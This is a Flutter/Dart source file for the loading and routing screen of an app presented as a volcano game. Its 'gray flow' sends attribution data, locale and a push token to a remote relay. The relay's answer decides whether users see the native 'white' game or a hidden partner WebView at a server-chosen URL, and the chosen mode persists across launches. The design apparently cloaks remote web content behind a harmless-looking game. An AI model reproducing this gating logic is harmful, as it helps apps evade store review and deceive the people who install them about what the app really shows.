import 'dart:io';

import 'package:flutter/material.dart';
import 'package:flutter/services.dart';

import '../env/runtime_profile.dart';
import '../relay/shell_mode.dart';
import '../runtime/config_relay.dart';
import '../runtime/link_probe.dart';
import '../runtime/signal_courier.dart';
import '../runtime/tracker_beacon.dart';
import '../runtime/vault_keeper.dart';
import 'eruption_alert_prompt.dart';
import 'magma_shell.dart' deferred as shell;
import 'offline_caldera.dart';
import 'white_game_gate.dart';

/// Entry / routing screen.
///
/// Plays a static volcano background and a hand-painted lava progress bar
/// while the gray flow decides whether to surface the partner WebView or
/// fall back to the native Volcano Boom game.
class IgnitionGate extends StatefulWidget {
  final VaultKeeper vault;
  final LinkProbe link;
  final TrackerBeacon beacon;
  final ConfigRelay relay;
  final SignalCourier courier;

  const IgnitionGate({
    super.key,
    required this.vault,
    required this.link,
    required this.beacon,
    required this.relay,
    required this.courier,
  });

  @override
  State<IgnitionGate> createState() => _IgnitionGateState();
}

class _IgnitionGateState extends State<IgnitionGate>
    with SingleTickerProviderStateMixin {
  late final AnimationController _heatBar;
  bool _exited = false;
  double _progress = 0.0;

  @override
  void initState() {
    super.initState();
    _allowAllOrientations();
    _heatBar = AnimationController(
      vsync: this,
      duration: const Duration(milliseconds: 1600),
    )..addListener(() {
        if (mounted) setState(() => _progress = _heatBar.value);
      });
    _heatBar.forward();

    widget.courier.onTokenRotate = _onTokenRotate;
    _run();
  }

  void _allowAllOrientations() {
    SystemChrome.setPreferredOrientations(const [
      DeviceOrientation.portraitUp,
      DeviceOrientation.portraitDown,
      DeviceOrientation.landscapeLeft,
      DeviceOrientation.landscapeRight,
    ]);
  }

  Future<void> _animateTo(double target, {int ms = 350}) async {
    await _heatBar.animateTo(
      target.clamp(0.0, 1.0),
      duration: Duration(milliseconds: ms),
      curve: Curves.easeOut,
    );
  }

  Future<void> _run() async {
    await widget.courier.boot().catchError((_) {});

    final mode = widget.vault.currentMode();
    switch (mode) {
      case ShellMode.partner:
        await _resumePartner();
        break;
      case ShellMode.native:
        await _animateTo(1.0, ms: 700);
        await Future.delayed(const Duration(milliseconds: 200));
        _toWhiteGame();
        break;
      case ShellMode.unknown:
        await _firstLaunch();
        break;
    }
  }

  Future<void> _firstLaunch() async {
    await _animateTo(0.15);
    final online = await widget.link.hasReachableInternet();
    if (!online) {
      await _animateTo(0.4);
      _toOffline(firstLaunch: true);
      return;
    }

    await _animateTo(0.45);
    await widget.beacon.boot();

    await Future.wait([
      widget.beacon.awaitConversion(),
      widget.beacon.awaitDeepLink(),
    ]);

    await _animateTo(0.75);

    final body = await widget.beacon.composeRelayBody(
      locale: _locale(),
      pushToken: widget.courier.token,
    );
    final verdict = await widget.relay.ask(body);

    if (verdict.granted && verdict.destination != null) {
      await widget.vault.persistMode(ShellMode.partner);
      await _animateTo(1.0);
      await Future.delayed(const Duration(milliseconds: 320));
      if (!mounted) return;
      _toMagma(verdict.destination!);
    } else {
      await widget.vault.persistMode(ShellMode.native);
      await _animateTo(1.0);
      await Future.delayed(const Duration(milliseconds: 320));
      if (!mounted) return;
      _toWhiteGame();
    }
  }

  Future<void> _resumePartner() async {
    await _animateTo(0.2);
    final online = await widget.link.hasReachableInternet();
    if (!online) {
      await _animateTo(1.0);
      _toOffline(firstLaunch: false);
      return;
    }

    final pushUrl = await widget.vault.takePushUrl();
    if (pushUrl != null) {
      await _animateTo(1.0);
      await Future.delayed(const Duration(milliseconds: 280));
      if (!mounted) return;
      _toMagma(pushUrl);
      return;
    }

    final cached = await widget.relay.cachedDestination();

    await _animateTo(0.5);
    await widget.beacon.boot();
    await Future.wait([
      widget.beacon
          .awaitConversion(budget: RuntimeProfile.attributionWaitReturning),
      widget.beacon.awaitDeepLink(),
    ]);

    final body = await widget.beacon.composeRelayBody(
      locale: _locale(),
      pushToken: widget.courier.token,
    );
    final verdict = await widget.relay.ask(body);

    await _animateTo(1.0);
    await Future.delayed(const Duration(milliseconds: 280));
    if (!mounted) return;

    if (verdict.granted && verdict.destination != null) {
      _toMagma(verdict.destination!);
    } else if (cached != null) {
      _toMagma(cached);
    } else {
      _toOffline(firstLaunch: false);
    }
  }

  String _locale() => Platform.localeName.replaceAll('-', '_');

  void _onTokenRotate(String token) async {
    final body = await widget.beacon.composeRelayBody(
      locale: _locale(),
      pushToken: token,
    );
    widget.relay.ask(body);
  }

  Future<void> _toMagma(String url) async {
    if (_exited) return;
    _exited = true;
    await shell.loadLibrary();
    await shell.primeShell();
    if (!mounted) return;

    if (widget.vault.shouldShowAlertPrompt()) {
      Navigator.of(context).pushReplacement(
        MaterialPageRoute(
          builder: (_) => EruptionAlertPrompt(
            vault: widget.vault,
            courier: widget.courier,
            link: widget.link,
            shellUrl: url,
          ),
        ),
      );
    } else {
      Navigator.of(context).pushReplacement(
        MaterialPageRoute(
          builder: (_) => shell.MagmaShell(
            url: url,
            vault: widget.vault,
            courier: widget.courier,
            link: widget.link,
          ),
        ),
      );
    }
  }

  void _toWhiteGame() {
    if (_exited) return;
    _exited = true;
    Navigator.of(context).pushReplacement(
      MaterialPageRoute(builder: (_) => const WhiteGameGate()),
    );
  }

  void _toOffline({required bool firstLaunch}) {
    if (_exited) return;
    _exited = true;
    Navigator.of(context).pushReplacement(
      MaterialPageRoute(
        builder: (_) => OfflineCalderaScreen(
          retryBuilder: (_) => IgnitionGate(
            vault: widget.vault,
            link: widget.link,
            beacon: widget.beacon,
            relay: widget.relay,
            courier: widget.courier,
          ),
        ),
      ),
    );
  }

  @override
  void dispose() {
    widget.courier.onTokenRotate = null;
    _heatBar.dispose();
    super.dispose();
  }

  @override
  Widget build(BuildContext context) {
    final size = MediaQuery.of(context).size;
    final landscape =
        MediaQuery.of(context).orientation == Orientation.landscape;
    final bg = landscape
        ? 'assets/Horizontal_Loading_Screen.webp'
        : 'assets/Vertizal_Loading_Screen.webp';

    return Scaffold(
      backgroundColor: const Color(0xFF080304),
      body: Stack(
        fit: StackFit.expand,
        children: [
          Image.asset(
            bg,
            fit: BoxFit.cover,
            width: size.width,
            height: size.height,
            filterQuality: FilterQuality.high,
          ),
          Align(
            alignment: Alignment.bottomCenter,
            child: FractionallySizedBox(
              heightFactor: landscape ? 0.42 : 0.28,
              child: const DecoratedBox(
                decoration: BoxDecoration(
                  gradient: LinearGradient(
                    begin: Alignment.topCenter,
                    end: Alignment.bottomCenter,
                    colors: [Colors.transparent, Color(0xCC000000)],
                  ),
                ),
              ),
            ),
          ),
          Positioned(
            left: landscape ? size.width * 0.22 : size.width * 0.12,
            right: landscape ? size.width * 0.22 : size.width * 0.12,
            bottom: landscape ? size.height * 0.10 : size.height * 0.09,
            child: _LavaBar(progress: _progress, compact: landscape),
          ),
        ],
      ),
    );
  }
}

class _LavaBar extends StatelessWidget {
  final double progress;
  final bool compact;
  const _LavaBar({required this.progress, required this.compact});

  @override
  Widget build(BuildContext context) {
    final height = compact ? 14.0 : 18.0;
    return Column(
      mainAxisSize: MainAxisSize.min,
      children: [
        ClipRRect(
          borderRadius: BorderRadius.circular(height),
          child: Stack(
            children: [
              Container(
                height: height,
                color: const Color(0xFF1A0A04).withValues(alpha: 0.75),
              ),
              FractionallySizedBox(
                alignment: Alignment.centerLeft,
                widthFactor: progress,
                child: Container(
                  height: height,
                  decoration: const BoxDecoration(
                    gradient: LinearGradient(
                      begin: Alignment.centerLeft,
                      end: Alignment.centerRight,
                      colors: [
                        Color(0xFFFFEB3B),
                        Color(0xFFFF6F00),
                        Color(0xFFC62828),
                      ],
                    ),
                  ),
                ),
              ),
            ],
          ),
        ),
        const SizedBox(height: 10),
        Text(
          'Heating up the magma…',
          style: TextStyle(
            color: const Color(0xFFFFE0B2),
            fontSize: compact ? 12 : 14,
            fontWeight: FontWeight.w600,
            letterSpacing: 0.6,
            shadows: const [
              Shadow(
                color: Colors.black87,
                blurRadius: 4,
                offset: Offset(0, 2),
              ),
            ],
          ),
        ),
      ],
    );
  }
}
